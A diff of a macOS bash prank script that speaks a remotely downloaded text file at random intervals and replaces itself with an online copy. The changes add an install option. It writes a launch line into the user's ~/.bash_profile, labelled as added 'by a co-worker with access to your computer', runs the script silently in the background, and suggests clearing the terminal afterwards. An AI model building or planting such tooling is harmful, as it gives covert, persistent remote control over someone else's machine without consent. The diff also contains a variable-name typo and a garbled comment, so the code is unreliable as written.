@@ -1,17 +1,13 @@
 #!/bin/bash
-# ON a random interval, download and speak the contents of a file if that file has changed.
+# On a random interval, download and speak the contents of a file if that file has changed.
 # THe file is spoken using the OSX say command.
 # This script is also updated and relaunched, if an online copy is different from the running copy.
 # Note: IF you change this local script and run it, your changes may be overwritten by the online copy!
 
 # Variables, you may want to adjust:
 # Enable debug output, usually commented out / not set
+# THere is also a -d option to enable debugging on the command-line.
 #debug='1'
-# IF the -debug option is passed as the first argument, enable debugging.
-if [ "$1" == "-debug" ]
-then
-debug=1
-fi
 # Version of this script
 script_version='1.2.2'
 # Where the text file to speak and other temporary files will go
@@ -30,6 +26,21 @@ selfdestruct_string="I am retiring, goodbye."
 # Options to the curl command, not including the output file.
 # -s = silent, -f = fail quietly, -o = output file name
 curl_options="-s -f"
+# The command to be placed in a shell initialization file, if the -i (install) command-line option is usednstall_location.
+# THis command should fail gracefully if the script no longer exists (if it was self-destructed).
+# Get the full path to $0, in case the script was run with a relative path like ./scriptName
+oldpwd=`pwd`
+relative_dir=`dirname $0`
+cd "$relative_Dir"
+full_script_path="`pwd`/`basename $0`"
+cd "$oldpwd"
+unset oldpwd
+unset relative_dir
+install_cmd="[ -r $full_script_path ] && $full_script_path >/dev/null 2>&1&"
+# A comment which will preceed $install_cmd. This should be somewhat helpful to the user.
+install_comment='# This was added by a co-worker with access to your computer:'
+# THe location, where $install_cmd should be written.
+install_location=`ls -d ~/.bash_profile`
 
 
 # ##### functions #####
@@ -43,6 +54,64 @@ echo "Debug: $*"
 fi
 } # debug
 
+
+function process_options {
+# Process command-line options
+debug "Processing command-line options: $@"
+while getopts dih option
+do
+debug "Processing option $option"
+case $option in
+i)
+# Perform installation
+install_script
+exit
+;;
+d)
+# ENable debugging
+debug=1
+;;
+h)
+# DIsplay help
+debug "Displaying help screen..."
+cat <<EOF
+On a random interval, download and speak the contents of a file if that file has changed.
+THe file is spoken using the Apple OSX say command.
+This script is also updated and relaunched, if an online copy is different from the running copy.
+
+
+
+Usage: $0 [options]
+-h - DIsplay this help screen.
+-d - Run in debug mode; output progress info.
+-i -- Install this script by adding a line to ${install_location}. The line which will be added is:
+$install_cmd
+
+THere are variables you may want to adjust (see the section at the top of this script ($0). Here are the current values of these variables:
+
+temp_dir, where the text file to speak and other temporary files will go - $temp_dir
+
+sayfile_name, name of the file to speak, should be in $temp_dir - $sayfile_name
+
+sayfile_url, full URL to fetch the say-file, including file name - $sayfile_url
+
+script_url, URL to fetch new versions of this script (if not set, script will not auto-update) - $script_url
+
+selfdestruct_string, self-destruct string - IF the say-file contains only this string, this script will delete itself - $selfdestruct_string
+
+install_cmd, the command to be placed in a shell inintialization file, if the -i (install) command-line option is used - $install_cmd
+
+install_comment, a comment to be placed above install_cmd (so the user knows how their shel linitialization file got edited) - $install_comment
+
+install_location, the shell initialization file to place install_cmd - $install_location
+
+EOF
+exit
+;;
+# INvalid options are handled by getopts
+esac
+done
+} # process_options
 
 function random_sleep {
 # SLeep a random number of seconds, at least a minute., max 6 minutes
@@ -132,7 +201,68 @@ curl ${full_curl_options}
 } # get_file
 
 
+function install_script {
+# Install this script by placing a line in ~/.bash_profile.
+debug "Going to install $full_script_path in $install_location."
+
+# FIrst see whether there is already a line in bash_profile
+debug "Looking for this install_cmd in $install_location: $install_cmd"
+
+matched_install_cmd=`fgrep "$install_cmd" $install_location`
+if [ $? -eq 0 ]
+then
+# There is already an install command in $install_location
+debug "THere is already an install command in $install_location:"
+debug "$matched_install_cmd"
+debug "Not adding an installation command."
+echo "A command to run this script appears to already be installed in $install_location - doing nothing."
+else
+# No line in bash_profile, add one.
+debug "No installation command in $install_location - adding one."
+# Backup the $install_location just in case.
+local backup_install_location="${install_location}.pre_`basename $0`.$$"
+debug "Backing up $install_location to $backup_install_location"
+cp -p $install_location $backup_install_location >/dev/null
+if [ $? -gt 0 ]
+then
+echo "Backup of $install_location failed - aborting."
+exit 1
+else
+# Add the install command to $install_location
+debug "Adding this command to $install_location:"
+debug "$install_cmd"
+# Add a newline to $install_location first, in case there is no newline on the last line of that file.
+echo >> $install_location
+# Also add a helpful comment as to how $install_cmd got in $install_location
+echo $install_comment >> $install_location
+# Add the command to run this script.
+echo "$install_cmd" >>$install_location
+# Add a blank line after, too.
+echo >> $install_location
+echo "$full_script_path has been installed to $install_location. THe file $install_location has been backed up to $backup_install_location before editing."
+echo "Running `basename $0` in the background now. YOu should probably clear this terminal window."
+
+# GO ahead and run the script now.
+# IF we are debugging, continue debugging and run in the foreground
+if [ $debug ]
+then
+debug "Running this script in the foreground with debugging enabled"
+sleep 1 && $full_script_path -d
+else
+# NOt debugging, run the script in the background.
+# SLeep a second to give this copy of the script time to exit, otherwise the below invocation will fail to run.
+#sleep 1 && $full_script_path >/dev/null 2>&1 &
+exec "$full_script_path" >/dev/null 2>&1 &
+fi # not debugging, run script
+fi # cp succeeded
+fi # added an install cmd
+exit
+
+} # install_script
 # ##### Main Script #####
+# PRocess command-line options.
+# YOu have to pass $* to this function otherwise it will not see the options
+process_options $@
 
 debug "`basename $0`, version $script_version"
 
